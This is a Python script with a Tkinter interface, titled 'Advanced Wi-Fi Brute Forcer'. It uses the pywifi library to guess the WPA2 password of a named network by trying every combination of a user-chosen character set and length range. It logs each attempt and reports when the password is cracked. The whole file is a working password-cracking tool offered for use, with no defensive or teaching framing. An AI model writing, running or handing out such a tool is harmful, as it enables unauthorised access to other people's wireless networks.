import pywifi
from pywifi import const
import time
import tkinter as tk
from tkinter import messagebox
import threading
import itertools
from datetime import datetime
import tkinter.ttk as ttk
import os
import winsound  # Windows only

stop_flag = False  # Global flag
max_attempts = 0

def try_connect(wifi_name, password, retries=3):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    for _ in range(retries):
        try:
            iface.disconnect()
            time.sleep(1)

            profile = pywifi.Profile()
            profile.ssid = wifi_name
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)

            iface.connect(tmp_profile)
            time.sleep(3)

            if iface.status() == const.IFACE_CONNECTED:
                iface.disconnect()
                return True
        except Exception:
            time.sleep(1)
    return False

def start_brute():
    global stop_flag, max_attempts
    stop_flag = False

    ssid = ssid_entry.get()
    charset = charset_entry.get()
    min_len = int(minlen_entry.get())
    max_len = int(maxlen_entry.get())
    max_attempts = int(maxtries_entry.get()) if maxtries_entry.get().isdigit() else 0

    if not ssid or not charset:
        messagebox.showerror("Error", "SSID and charset are required")
        return

    threading.Thread(target=brute_force, args=(ssid, charset, min_len, max_len)).start()

def stop_brute():
    global stop_flag
    stop_flag = True
    status_label.config(text="Stopped by user.")

def play_alert():
    # Windows only alert sound
    try:
        winsound.MessageBeep(winsound.MB_OK)
    except:
        pass

def brute_force(ssid, charset, min_len, max_len):
    global stop_flag, max_attempts
    log_file = f"log_{ssid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    start_time = time.time()
    attempts = 0

    status_label.config(text="Brute-force started...")
    window.update()

    for length in range(min_len, max_len + 1):
        combos = itertools.product(charset, repeat=length)
        total = pow(len(charset), length)

        for index, pwd_tuple in enumerate(combos, start=1):
            if stop_flag or (max_attempts > 0 and attempts >= max_attempts):
                status_label.config(text="Stopped by limit or user.")
                return

            password = ''.join(pwd_tuple)
            attempts += 1
            progress = (index / total) * 100
            progress_var.set(progress)
            percent_label.config(text=f"{int(progress)}%")

            elapsed = time.time() - start_time
            speed = attempts / elapsed if elapsed > 0 else 0

            status_label.config(
                text=f"Trying: {password} | {speed:.2f} pwd/sec | Time: {int(elapsed)}s"
            )
            window.update()

            with open(log_file, "a") as log:
                log.write(f"Trying: {password}\n")

            if try_connect(ssid, password):
                with open(log_file, "a") as log:
                    log.write(f"[SUCCESS] Password found: {password}\n")
                play_alert()
                messagebox.showinfo("Success", f"Password found: {password}")
                status_label.config(text="✅ Password cracked successfully!")
                return

    status_label.config(text="❌ Password not found in range.")
    messagebox.showinfo("Failed", "Password not found within generated combinations.")

# GUI setup
window = tk.Tk()
window.title("Advanced Wi-Fi Brute Forcer")
window.geometry("580x520")

tk.Label(window, text="Wi-Fi SSID:").pack(pady=5)
ssid_entry = tk.Entry(window, width=45)
ssid_entry.pack()

tk.Label(window, text="Charset (e.g., abc123):").pack()
charset_entry = tk.Entry(window, width=45)
charset_entry.insert(0, "abc123")
charset_entry.pack()

tk.Label(window, text="Min Length:").pack()
minlen_entry = tk.Entry(window, width=10)
minlen_entry.insert(0, "3")
minlen_entry.pack()

tk.Label(window, text="Max Length:").pack()
maxlen_entry = tk.Entry(window, width=10)
maxlen_entry.insert(0, "4")
maxlen_entry.pack()

tk.Label(window, text="Max Tries (0 = no limit):").pack()
maxtries_entry = tk.Entry(window, width=10)
maxtries_entry.insert(0, "0")
maxtries_entry.pack()

tk.Button(window, text="Start Brute Force", command=start_brute, bg="#28a745", fg="white").pack(pady=10)
tk.Button(window, text="Stop", command=stop_brute, bg="red", fg="white").pack(pady=5)

progress_var = tk.DoubleVar()
progress_bar = ttk.Progressbar(window, variable=progress_var, maximum=100, length=450)
progress_bar.pack(pady=5)
percent_label = tk.Label(window, text="0%")
percent_label.pack()

status_label = tk.Label(window, text="")
status_label.pack()

window.mainloop()
